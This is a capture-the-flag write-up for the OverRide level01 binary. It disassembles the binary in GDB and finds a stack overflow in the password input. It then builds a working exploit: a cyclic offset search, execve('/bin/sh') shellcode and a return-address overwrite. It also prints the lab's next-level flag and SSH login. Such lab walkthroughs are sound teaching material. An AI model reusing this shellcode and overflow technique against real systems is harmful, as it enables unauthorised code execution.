# level01

For this level, we inspect `main`, `verify_user_name`, and `verify_user_pass` manually with GDB. We then decode the addresses found in the assembly with `decode_address.c`.

## Get the binary

Read the password obtained from level00:

```sh
cat level00/flag
```

From the repository root, copy the `level01` ELF binary from the VM:

```sh
scp -P 2222 level01@127.0.0.1:/home/users/level01/level01 ./level01/src/level01
```

When `scp` asks for a password, paste the content of `level00/flag`.

The local binary should now be:

```text
level01/src/level01
```

This file is required by `decode_address`, which reads the ELF program headers
and maps virtual addresses to bytes stored in the binary.

## 1. Save `main_dump_gdb`

On the VM, start GDB with the binary loaded:

```sh
gdb ./level01
```

Save only `main` first:

```gdb
set disassembly-flavor intel
set pagination off
set logging file /tmp/level01_main_dump_gdb
set logging overwrite on
set logging on
disas main
set logging off
quit
```

From the repository root on the host, copy this first dump:

```sh
scp -P 2222 level01@127.0.0.1:/tmp/level01_main_dump_gdb ./level01/src/main_dump_gdb
```

Use the content of `level00/flag` as the password.

## 2. Read `main_dump_gdb`

The first input is read with:

```asm
mov    DWORD PTR [esp+0x4],0x100
mov    DWORD PTR [esp],0x804a040
call   0x8048370 <fgets@plt>
call   0x8048464 <verify_user_name>
```

This tells us:

- `fgets` can read up to `0x100` bytes.
- the destination is the global address `0x0804a040`.
- the input is checked by `verify_user_name`.

The second input is read with:

```asm
mov    DWORD PTR [esp+0x4],0x64
lea    eax,[esp+0x1c]
mov    DWORD PTR [esp],eax
call   0x8048370 <fgets@plt>
call   0x80484a3 <verify_user_pass>
```

The password destination is the local stack buffer at `esp + 0x1c`, and
`fgets` is allowed to read `0x64` bytes.

Most importantly, `main_dump_gdb` reveals two functions that need separate
analysis:

```asm
call   0x8048464 <verify_user_name>
...
call   0x80484a3 <verify_user_pass>
```

We only know to dump these functions after finding their names in `main`.

## 3. Save the verification dumps

Return to the VM and open GDB again:

```sh
gdb ./level01
```

Save `verify_user_name`:

```gdb
set disassembly-flavor intel
set pagination off
set logging file /tmp/level01_username_dump_gdb
set logging overwrite on
set logging on
disas verify_user_name
set logging off
```

Save `verify_user_pass`:

```gdb
set logging file /tmp/level01_password_dump_gdb
set logging overwrite on
set logging on
disas verify_user_pass
set logging off
quit
```

Copy both files from the host:

```sh
scp -P 2222 level01@127.0.0.1:/tmp/level01_username_dump_gdb ./level01/src/username_dump_gdb
scp -P 2222 level01@127.0.0.1:/tmp/level01_password_dump_gdb ./level01/src/password_dump_gdb
```

## 4. Prepare `decode_address`

Reading the verification dumps reveals virtual addresses, but not the text
stored at those addresses. The shared `decode_address.c` maps an ELF virtual
address to its file offset and prints the stored string.

Compile the decoder from the repository root:

```sh
gcc -Wall -Wextra -Werror decode_address.c -o decode_address
```

## 5. Decode the username addresses

The relevant instructions in `username_dump_gdb` are:

```asm
mov    DWORD PTR [esp],0x8048690
call   0x8048380 <puts@plt>
mov    edx,0x804a040
mov    eax,0x80486a8
mov    ecx,0x7
mov    esi,edx
mov    edi,eax
repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
```

This gives three data addresses to investigate:

```text
0x08048690
0x0804a040
0x080486a8
```

Decode all three:

```sh
./decode_address level01/src/level01 0x08048690
./decode_address level01/src/level01 0x0804a040
./decode_address level01/src/level01 0x080486a8
```

Output:

```text
0x08048690 (file offset 0x690): "verifying username....\n"
0x0804a040: address is zero-initialized memory (BSS), not file data
0x080486a8 (file offset 0x6a8): "dat_wil"
```

This tells us:

- `0x08048690` is the verification message passed to `puts`.
- `0x0804a040` is the global `.bss` username buffer.
- `0x080486a8` contains the expected username, `dat_wil`.

`repz cmps` uses `ecx = 7`, so it compares seven bytes from the username buffer
with `dat_wil`.

## 6. Decode the password address

The relevant instructions in `password_dump_gdb` are:

```asm
mov    eax,DWORD PTR [ebp+0x8]
mov    edx,eax
mov    eax,0x80486b0
mov    ecx,0x5
mov    esi,edx
mov    edi,eax
repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
```

The address to investigate is:

```text
0x080486b0
```

Decode it:

```sh
./decode_address level01/src/level01 0x080486b0
```

Output:

```text
0x080486b0 (file offset 0x6b0): "admin"
```

`repz cmps` uses `ecx = 5`, so the function compares five password bytes with
`admin`.

## Current conclusion

At this stage, the GDB dumps and decoded addresses show:

```text
username: dat_wil
password: admin
```

Testing them:

```sh
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
admin
nope, incorrect password...
```

So `dat_wil` is the correct username, but `admin` does not give access through
the normal password path.

The suspicious branch in `main_dump_gdb` is:

```asm
cmp    DWORD PTR [esp+0x5c],0x0
je     0x8048597 <main+199>
cmp    DWORD PTR [esp+0x5c],0x0
je     0x80485aa <main+218>
```

If the value is zero, the first `je` jumps to the failure branch. If it is not
zero, the identical second comparison is also not zero, so execution again
falls into the failure branch. The normal success branch is therefore
unreachable.

This means the next step is not to find a normal password. The next thing to
inspect is the password input buffer. `main_dump_gdb` initializes it with:

```asm
lea    ebx,[esp+0x1c]
mov    eax,0x0
mov    edx,0x10
mov    edi,ebx
mov    ecx,edx
rep stos DWORD PTR es:[edi],eax
```

`rep stos` clears `0x10` double words, or `0x40` bytes. Later, `fgets` receives
the size `0x64`, so the password input can overflow that local buffer.

## Exploitation strategy

There are two reads from the same standard input stream:

```c
fgets(&a_user_name, 0x100, stdin);
fgets(&buf, 0x64, stdin);
```

The first `fgets` can consume at most `0x100 - 1`, or 255 bytes. If the input does not contain a newline in those first 255 bytes, the bytes left in the stream are consumed by the second `fgets`.

This lets us build one continuous payload:

```text
username + shellcode + padding + overwritten EIP
```

The first 255 bytes are stored in the global username buffer. The remaining bytes are read into the vulnerable password buffer.

## Find the cyclic offset

Start the payload with the required username, fill the rest of the first input, then append a cyclic pattern in gdb:

```gdb
r < <(python -c 'print "dat_wil" + "\x90" * (256 - 7) + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"')
```

The crash gives:

```text
Program received signal SIGSEGV, Segmentation fault.
0x63413663 in ?? ()
```

Searching this value in the cyclic pattern gives:

```text
79
```

The pattern offset is 79 because one byte from the 256-byte prefix remains after the first `fgets` consumes its maximum of 255 bytes. Therefore the second `fgets` receives:

```text
1 leftover byte + 79 pattern bytes + overwritten EIP
```

This agrees with the earlier result that saved EIP is reached after 80 bytes in the second buffer.

## Store the shellcode

Use this 21-byte `execve("/bin/sh")` shellcode:

```text
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
```

Equivalent x86 instructions:

```asm
xor  ecx, ecx        ; ecx = 0
mul  ecx             ; eax = 0 and edx = 0
mov  al, 0x0b        ; Linux syscall 11: execve
push ecx             ; null terminator
push 0x68732f2f      ; "//sh"
push 0x6e69622f      ; "/bin"
mov  ebx, esp        ; ebx points to "/bin//sh"
int  0x80            ; execute the syscall
```

For 32-bit Linux, `execve` expects:

```text
eax = 11          syscall number
ebx = "/bin//sh" filename
ecx = 0           argv
edx = 0           envp
```

The shellcode avoids null bytes inside the injected byte sequence because a null byte could terminate string-based input handling before the full payload is copied.

The global username buffer starts at:

```text
0x0804a040
```

The first seven bytes must contain `dat_wil`. The shellcode begins immediately afterward, at:

```text
0x0804a040 + 7 = 0x0804a047
```

On x86, the address must be written in little-endian byte order:

```text
0x0804a047 -> \x47\xa0\x04\x08
```

The expression below starts with the address in normal byte order and reverses it:

```python
"\x08\x04\xa0\x47"[::-1]
```

## Final exploit

The padding calculation is:

```python
padding = "X" * (256 - len(user + shellcode) + 79)
```

Why:

- `256 - len(user + shellcode)` fills the first-input region.
- `+ 79` reaches saved EIP after the one byte left by the first `fgets`.
- the final four bytes replace saved EIP with `0x0804a047`.

Run:

```sh
(python -c '''
user = "dat_wil"
shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
padding = "X" * (256 - len(user + shellcode) + 79)

print user + shellcode + padding + "\x08\x04\xa0\x47"[::-1]
'''; echo 'cat /home/users/level02/.pass') | ./level01
```

The username check reads `dat_wil`, the shellcode remains in `a_user_name`, the second `fgets` overflows saved EIP, and execution returns to the shellcode at `0x0804a047`.

The flag is:

```text
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

You can now acces to level02:

```sh
ssh level02@127.0.0.1 -p 2222
password: PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
